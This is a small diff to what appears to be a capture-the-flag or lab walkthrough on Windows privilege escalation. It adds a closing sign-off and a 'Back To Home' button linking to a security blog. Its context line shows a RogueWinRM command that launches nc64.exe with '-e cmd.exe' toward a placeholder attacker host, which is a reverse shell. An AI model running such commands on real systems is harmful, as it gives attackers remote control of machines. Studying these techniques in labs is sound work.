@@ -178,6 +178,12 @@ c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKE
 ![](https://i.imgur.com/EGtIOIr.png)
 
 
+That will be all for today, Have Fun 🥳🙏
+
+
+<button onclick="window.location.href='https://sec-fortress.github.io';">Back To Home螥</button>
+
+
 
 
 
